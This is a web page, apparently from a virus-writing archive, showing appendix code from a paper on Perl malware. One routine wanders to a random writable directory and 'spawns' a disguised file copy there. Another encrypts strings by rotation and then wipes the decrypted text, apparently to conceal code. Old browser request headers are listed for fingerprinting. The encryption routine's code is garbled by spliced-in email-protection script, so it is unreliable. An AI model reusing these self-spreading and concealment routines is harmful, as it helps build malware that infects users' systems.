&nbsp; <span style="color: #cc66cc;">86</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/opendir.html"><span style="color: #000066;">opendir</span></a> <span style="color: black;">&#40;</span>DIR<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;$traverse&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">87</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/readdir.html"><span style="color: #000066;">readdir</span></a> <span style="color: black;">&#40;</span>DIR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/readdir.html"><span style="color: #000066;">readdir</span></a> <span style="color: black;">&#40;</span>DIR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">88</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/undef.html"><span style="color: #000066;">undef</span></a> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@listing</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/undef.html"><span style="color: #000066;">undef</span></a> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@directory</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">89</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@listing</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/readdir.html"><span style="color: #000066;">readdir</span></a> <span style="color: black;">&#40;</span>DIR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">90</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/closedir.html"><span style="color: #000066;">closedir</span></a> <span style="color: black;">&#40;</span>DIR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">91</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
&nbsp; <span style="color: #cc66cc;">92</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$dircount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$entry</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@listing</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">93</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">-</span>d <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;$traverse&quot;</span> <span style="color: #339933;">.</span> <span style="color: #ff0000;">&quot;$entry&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">94</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$directory</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$dircount</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;$traverse&quot;</span> <span style="color: #339933;">.</span> <span style="color: #ff0000;">&quot;$entry/&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">95</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$dircount</span><span style="color: #339933;">++;</span><br/>
&nbsp; <span style="color: #cc66cc;">96</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">97</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> <span style="color: #0000ff;">$dircount</span><span style="color: #339933;">--;</span><br/>
&nbsp; <span style="color: #cc66cc;">98</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
&nbsp; <span style="color: #cc66cc;">99</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$choose</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">@directory</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">100</span><span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$traverse</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$directory</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$choose</span><span style="color: black;">&#93;</span> <span style="color: #b1b100;">if</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/defined.html"><span style="color: #000066;">defined</span></a> <span style="color: #0000ff;">$directory</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$choose</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">101</span><span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">102</span><span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: black;">&#125;</span> <span style="color: #b1b100;">until</span> <span style="color: black;">&#40;</span><span style="color: #339933;">-</span>w <span style="color: #0000ff;">$traverse</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">103</span><span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">104</span><span style="color: #339933;">:</span> &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/opendir.html"><span style="color: #000066;">opendir</span></a> <span style="color: black;">&#40;</span>DIR<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;$traverse&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">105</span><span style="color: #339933;">:</span> &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/readdir.html"><span style="color: #000066;">readdir</span></a> <span style="color: black;">&#40;</span>DIR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/readdir.html"><span style="color: #000066;">readdir</span></a> <span style="color: black;">&#40;</span>DIR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">106</span><span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff;">@dirlist</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/readdir.html"><span style="color: #000066;">readdir</span></a> <span style="color: black;">&#40;</span>DIR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">107</span><span style="color: #339933;">:</span> &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/closedir.html"><span style="color: #000066;">closedir</span></a> <span style="color: black;">&#40;</span>DIR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">108</span><span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; <span style="color: #cc66cc;">109</span><span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff;">$elen</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@dirlist</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">110</span><span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff;">$luckyfile</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$elen</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">111</span><span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff;">$filename</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$dirlist</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$luckyfile</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">112</span><span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff;">$randomadd</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">2</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">113</span><span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; <span style="color: #cc66cc;">114</span><span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #b1b100;">until</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$filename</span> <span style="color: #339933;">!~</span> <span style="color: #009966; font-style: italic;">/\./</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">115</span><span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#40;</span><span style="color: #0000ff;">$filename</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">$junk</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/split.html"><span style="color: #000066;">split</span></a> <span style="color: black;">&#40;</span><span style="color: #009966; font-style: italic;">/\./</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">$filename</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">116</span><span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">117</span><span style="color: #339933;">:</span> &nbsp; &nbsp; <span style="color: #0000ff;">$filename</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$traverse</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">$filename</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">$randomadd</span> <span style="color: #339933;">.</span> <span style="color: #ff0000;">&quot;.tar.gz&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">118</span><span style="color: #339933;">:</span> &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;Spawning $filename<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">119</span><span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<h3><a name="pa4"></a>A.4 Example program for chapter 6</h3>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$code</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;Coded.by.One.Semicolon&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$rotate</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">34125</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;to encode - $code<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$encrypted</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">&amp;encrypt</span><span style="color: black;">&#40;</span><span style="color: #0000ff;">$code</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;encrypted - $encrypted<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$decrypted</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">&amp;decrypt</span><span style="color: black;">&#40;</span><span style="color: #0000ff;">$encrypted</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;decrypted - $decrypted<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">9</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$decrypted</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">&amp;clean</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;decrypted&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">10</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;cleaned &nbsp; - $decrypted<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">11</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">12</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> encrypt <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">13</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">my</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$toencrypt</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@_</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">14</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$rotate</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">15</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$toencrypt</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;"><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="deaaacf1bff3a49e9ff384f0eef3e7">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/0-9.@A-Za-z/</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">16</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">17</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/return.html"><span style="color: #000066;">return</span></a> <span style="color: #0000ff;">$toencrypt</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">18</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">19</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">20</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> decrypt <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">21</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">my</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$todecrypt</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@_</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">22</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$rotate</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">23</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$todecrypt</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">tr/0-9.@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="31701c6b501c4b1e501c4b71701c6b1f011c08">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">24</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">25</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/return.html"><span style="color: #000066;">return</span></a> <span style="color: #0000ff;">$todecrypt</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">26</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">27</span> <span style="color: #339933;">:</span> <br/>
&nbsp; <span style="color: #cc66cc;">28</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> clean <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">29</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">my</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$toclean</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@_</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">30</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$clnlength</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/length.html"><span style="color: #000066;">length</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$</span><span style="color: black;">&#123;</span><span style="color: #0000ff;">$toclean</span><span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">31</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$clncount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$clncount</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000ff;">$clnlength</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$clncount</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">32</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$replacement</span> <span style="color: #339933;">.=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/chr.html"><span style="color: #000066;">chr</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">256</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">33</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">34</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$</span><span style="color: black;">&#123;</span><span style="color: #0000ff;">$toclean</span><span style="color: black;">&#125;</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$replacement</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">35</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<h3><a name="pb"></a>B Browser footprints</h3>
<h4><a name="pb1"></a>B.1 Note</h4>
<p>Some browsers have large Accept, Accept-Charset fields. They have been moved to the next line and are noted by an indent.</p>
<h4><a name="pb2"></a>B.2 Netscape 4.73</h4>
<pre>
 GET / HTTP/1.0
 Connection: Keep-Alive
 User-Agent: Mozilla/4.73 (Win95; U)
 Host: localhost:8008
 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
 Accept-Encoding: gzip
 Accept-Language: en
 Accept-Charset: iso-8859-1,*,utf-8
</pre>
<h4><a name="pb3"></a>B.3 Netscape 6.1</h4>
<pre>
 GET / HTTP/1.1
 Host: localhost:8008
 User-Agent: Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:0.9.2) 
	Gecko/20010726 Netscape6/6.1
 Accept: text/xml, application/xml, application/xhtml+xml, text/html;q=0.9,
        image/png, image/jpeg, image/gif;q=0.2, text/plain;q=0.8, text/css,
        */*;q=0.1
 Accept-Language: en-us
 Accept-Encoding: gzip,deflate,compress,identity
 Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66
 Keep-Alive: 300
 Connection: keep-alive
</pre>
<h4><a name="pb4"></a>B.4 Opera 6</h4>
<pre>
 GET / HTTP/1.1
 User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 6.0  [en]
 Host: localhost:8008
 Accept: text/html, image/png, image/jpeg, image/gif, image/x-xbitmap, */*
 Accept-Language: en
 Accept-Charset: iso-8859-1,utf-8,iso-2022-jp,shift_jis,big5,utf-16,euc-jp,
        euc-kr,x-gbk,hz-gb-2312,euc-tw,koi8-r,koi8-u,viscii,windows-sami-2,
        ibm866,iso-8859-2,iso-8859-3,iso-8859-4,iso-8859-5,iso-8859-6,
        iso-8859-7,iso-8859-8,iso-8859-9,iso-8859-10,iso-8859-11,iso-8859-13,
        iso-8859-14,iso-8859-15,windows-1258,windows-1251,windows-1250,
        windows-1253,windows-1252,windows-1255,windows-1254,windows-1257,
        windows-1256,windows-sami-2
 Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
 Connection: Keep-Alive
</pre>
<h4><a name="pb5"></a>B.5 Internet Explorer 5.50.4134.0100</h4>
<pre>
 GET / HTTP/1.1
 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
 Accept-Language: en-ca
 Accept-Encoding: gzip, deflate
 User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)
 Host: localhost:8008
 Connection: Keep-Alive
</pre>
[<a style="" href="/lib/?lang=EN&amp;index=WO#vos00">Back to index</a>] [<a href="/lib/vos00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vos00">de</a><a href="/lib/index.php?lang=en&amp;id=vos00">en</a><a href="/lib/index.php?lang=es&amp;id=vos00">es</a><a href="/lib/index.php?lang=it&amp;id=vos00">it</a><a href="/lib/index.php?lang=fr&amp;id=vos00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vos00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vos00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vos00">ua</a></div>
</body>
</html>
